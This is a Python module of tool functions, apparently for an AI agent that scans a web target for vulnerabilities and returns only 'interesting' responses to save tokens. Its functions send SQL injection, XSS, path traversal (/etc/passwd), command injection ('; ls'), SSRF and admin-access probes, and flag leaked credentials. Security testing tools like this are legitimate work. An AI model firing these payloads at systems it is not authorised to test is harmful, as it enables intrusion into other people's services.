"""
Smart HTTP Tools - Only return USEFUL information to OpenAI
Filter out boring "200 OK" responses to save 90% of tokens

Philosophy: Only send context that helps the agent make decisions
- Vulnerabilities: YES
- Errors: YES
- Admin content: YES
- Normal "200 OK": NO (waste of tokens!)
"""

import json
import os
import re
from typing import Any, Dict, List, Optional

import httpx

try:
    from orchestrator.oai_agents import function_tool
except ModuleNotFoundError:
    from oai_agents import function_tool


TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:8001")


def _is_interesting(status_code: int, body: str) -> tuple[bool, List[str]]:
    """
    Determine if a response is interesting (worth sending to OpenAI).
    Returns: (is_interesting, reasons)
    """
    reasons = []
    body_lower = body.lower()

    # Errors are interesting
    if status_code >= 400:
        reasons.append(f"HTTP {status_code}")

    # Security indicators
    if any(kw in body_lower for kw in ["select", "insert", "union", "sql", "mysql", "database error"]):
        reasons.append("SQL keywords")

    if any(kw in body_lower for kw in ["<script", "onerror", "onclick", "javascript:"]):
        reasons.append("XSS vector")

    if "admin" in body_lower and status_code == 200:
        reasons.append("admin content")

    if any(kw in body_lower for kw in ["traceback", "exception", "error at line", "stack trace"]):
        reasons.append("error trace")

    if any(kw in body_lower for kw in ["password", "secret", "api_key", "token", "credential"]):
        reasons.append("sensitive data")

    if any(kw in body_lower for kw in ["root:", "uid=", "/etc/passwd", "[extensions]"]):
        reasons.append("path traversal")

    if any(kw in body_lower for kw in ["upload", "file uploaded", "avatar"]):
        reasons.append("file upload")

    # Redirects can be interesting
    if 300 <= status_code < 400:
        reasons.append("redirect")

    return (len(reasons) > 0, reasons)


@function_tool
def http_get_smart(url: str, params_json: Optional[str] = None) -> Dict[str, Any]:
    """
    Smart HTTP GET - Only returns INTERESTING responses.
    Normal "200 OK" responses are filtered out to save tokens.

    Args:
        url: URL to test
        params_json: Optional params

    Returns:
        Only if response is interesting (errors, vulns, etc.)
        Otherwise: {"skipped": True, "reason": "normal response"}
    """
    try:
        params = json.loads(params_json) if params_json else None
        resp = httpx.get(url, params=params, timeout=5.0)

        is_interesting, reasons = _is_interesting(resp.status_code, resp.text)

        if not is_interesting:
            # Boring response - don't waste tokens
            return {
                "skipped": True,
                "status": resp.status_code,
                "reason": "Normal response, no security indicators"
            }

        # Interesting! Return details
        return {
            "url": url,
            "status": resp.status_code,
            "indicators": reasons,
            "preview": resp.text[:100]  # Small preview
        }

    except Exception as exc:
        # Errors are always interesting
        return {
            "url": url,
            "error": str(exc)[:80],
            "indicators": ["request failed"]
        }


@function_tool
def http_batch_get_smart(urls_json: str) -> Dict[str, Any]:
    """
    Batch GET with smart filtering - Only returns INTERESTING responses.

    Example:
        Test 20 endpoints, only 3 have vulnerabilities
        → Only returns those 3, saves 85% of tokens!

    Args:
        urls_json: JSON array of URLs

    Returns:
        Only interesting responses (filtered from all results)
    """
    try:
        urls = json.loads(urls_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON"}

    interesting_results = []
    total_tested = 0
    skipped = 0

    for url in urls:
        total_tested += 1
        full_url = f"{TARGET_URL}{url}" if not url.startswith("http") else url

        try:
            resp = httpx.get(full_url, timeout=2.0, follow_redirects=False)

            is_interesting, reasons = _is_interesting(resp.status_code, resp.text)

            if is_interesting:
                interesting_results.append({
                    "url": url,
                    "status": resp.status_code,
                    "indicators": reasons,
                    "preview": resp.text[:80]
                })
            else:
                skipped += 1

        except Exception as exc:
            # Errors are interesting
            interesting_results.append({
                "url": url,
                "error": str(exc)[:60],
                "indicators": ["connection failed"]
            })

    if not interesting_results:
        return {
            "tested": total_tested,
            "interesting": 0,
            "summary": "All responses normal. No vulnerabilities found."
        }

    return {
        "tested": total_tested,
        "interesting": len(interesting_results),
        "skipped_boring": skipped,
        "findings": interesting_results,
        "summary": f"Found {len(interesting_results)} interesting responses out of {total_tested} tested"
    }


@function_tool
def test_sqli_smart(endpoints_json: str) -> Dict[str, Any]:
    """
    Test SQLi but ONLY return vulnerable endpoints.
    Don't waste tokens on "not vulnerable" responses.

    Args:
        endpoints_json: JSON array of endpoints to test

    Returns:
        ONLY vulnerable endpoints with proof
        If nothing found: {"vulnerable": 0, "summary": "No SQLi found"}
    """
    try:
        endpoints = json.loads(endpoints_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON"}

    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "admin'--"
    ]

    vulnerable = []
    total_tests = len(endpoints) * len(payloads)

    for endpoint in endpoints:
        for payload in payloads:
            test_url = f"{TARGET_URL}{endpoint}"
            params = {"search": payload, "q": payload, "id": payload}

            try:
                resp = httpx.get(test_url, params=params, timeout=1.5)
                body_lower = resp.text.lower()

                # Check for SQLi indicators
                if any(kw in body_lower for kw in ["sql", "mysql", "syntax", "database error", "unclosed quotation"]):
                    vulnerable.append({
                        "endpoint": endpoint,
                        "payload": payload,
                        "proof": resp.text[:100],
                        "status": resp.status_code
                    })
                    break  # Found vuln, next endpoint

            except:
                continue

    if not vulnerable:
        return {
            "tested": total_tests,
            "vulnerable": 0,
            "summary": "No SQL injection found"
        }

    return {
        "tested": total_tests,
        "vulnerable_count": len(vulnerable),
        "vulnerable_endpoints": vulnerable,
        "summary": f"SQLi confirmed on {len(vulnerable)} endpoints"
    }


@function_tool
def test_xss_smart(endpoints_json: str) -> Dict[str, Any]:
    """
    Test XSS but ONLY return vulnerable endpoints.

    Args:
        endpoints_json: JSON array of endpoints

    Returns:
        ONLY vulnerable endpoints, nothing else
    """
    try:
        endpoints = json.loads(endpoints_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON"}

    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ]

    vulnerable = []
    total_tests = len(endpoints) * len(payloads) * 2  # GET + POST

    for endpoint in endpoints:
        found = False

        for payload in payloads:
            if found:
                break

            test_url = f"{TARGET_URL}{endpoint}"

            for method in ['GET', 'POST']:
                try:
                    if method == 'GET':
                        resp = httpx.get(test_url, params={"comment": payload}, timeout=1.5)
                    else:
                        resp = httpx.post(test_url, json={"comment": payload}, timeout=1.5)

                    # Check if reflected
                    if payload in resp.text:
                        vulnerable.append({
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload
                        })
                        found = True
                        break

                except:
                    continue

    if not vulnerable:
        return {
            "tested": total_tests,
            "vulnerable": 0,
            "summary": "No XSS found"
        }

    return {
        "tested": total_tests,
        "vulnerable_count": len(vulnerable),
        "vulnerable_endpoints": vulnerable,
        "summary": f"XSS confirmed on {len(vulnerable)} endpoints"
    }


@function_tool
def scan_for_vulns_comprehensive(endpoints_json: str) -> Dict[str, Any]:
    """
    Comprehensive scan - Tests ALL attack vectors but ONLY returns findings.
    Perfect for "give me everything interesting" queries.

    Tests:
    - SQL injection
    - XSS
    - Path traversal
    - Command injection
    - SSRF
    - Auth bypass

    Only returns confirmed vulnerabilities, skips everything else.

    Args:
        endpoints_json: JSON array of endpoints to scan

    Returns:
        ONLY vulnerabilities found, grouped by type
    """
    try:
        endpoints = json.loads(endpoints_json)
    except json.JSONDecodeError:
        return {"error": "Invalid JSON"}

    findings = {
        "sqli": [],
        "xss": [],
        "path_traversal": [],
        "cmd_injection": [],
        "ssrf": [],
        "auth_bypass": []
    }

    total_tests = 0

    for endpoint in endpoints:
        test_url = f"{TARGET_URL}{endpoint}"

        # Quick SQLi test
        total_tests += 1
        try:
            resp = httpx.get(test_url, params={"id": "' OR '1'='1"}, timeout=1.0)
            if any(kw in resp.text.lower() for kw in ["sql", "mysql", "syntax"]):
                findings["sqli"].append(endpoint)
        except:
            pass

        # Quick XSS test
        total_tests += 1
        try:
            xss = "<script>alert(1)</script>"
            resp = httpx.get(test_url, params={"q": xss}, timeout=1.0)
            if xss in resp.text:
                findings["xss"].append(endpoint)
        except:
            pass

        # Path traversal
        total_tests += 1
        try:
            resp = httpx.get(test_url, params={"file": "../../../etc/passwd"}, timeout=1.0)
            if "root:" in resp.text:
                findings["path_traversal"].append(endpoint)
        except:
            pass

        # Command injection
        total_tests += 1
        try:
            resp = httpx.get(test_url, params={"cmd": "; ls"}, timeout=1.0)
            if any(kw in resp.text.lower() for kw in ["bin", "usr", "total"]):
                findings["cmd_injection"].append(endpoint)
        except:
            pass

        # SSRF
        total_tests += 1
        try:
            resp = httpx.get(test_url, params={"url": "http://localhost"}, timeout=1.0)
            if "localhost" in resp.text or "127.0.0.1" in resp.text:
                findings["ssrf"].append(endpoint)
        except:
            pass

        # Auth bypass (direct admin access)
        if "admin" in endpoint:
            total_tests += 1
            try:
                resp = httpx.get(test_url, timeout=1.0)
                if resp.status_code == 200:
                    findings["auth_bypass"].append(endpoint)
            except:
                pass

    # Remove empty categories
    findings = {k: v for k, v in findings.items() if v}

    if not findings:
        return {
            "tested": total_tests,
            "findings": 0,
            "summary": "No vulnerabilities found"
        }

    total_vulns = sum(len(v) for v in findings.values())

    return {
        "tested": total_tests,
        "findings_count": total_vulns,
        "findings": findings,
        "summary": f"Found {total_vulns} vulnerabilities across {len(findings)} categories"
    }


# ============================================================================
# USAGE EXAMPLE
# ============================================================================

"""
OLD WAY (sends 10KB of useless data):
    http_get("/api/products")
    → Returns: {"status": 200, "body": "...200 chars of normal HTML..."}
    → Agent sees: Normal response, nothing interesting
    → Wasted 1,500 tokens on boring data!

NEW WAY (sends only useful data):
    http_get_smart("/api/products")
    → Returns: {"skipped": True, "reason": "Normal response"}
    → Agent sees: Nothing interesting, move on
    → Used only 50 tokens!

EVEN BETTER (batch + filter):
    http_batch_get_smart(urls_json='[10 endpoints]')
    → Tests all 10 endpoints
    → Only returns the 2 that have vulnerabilities
    → Used 300 tokens instead of 15,000!

RESULT: 95% token savings by filtering out boring responses!
"""
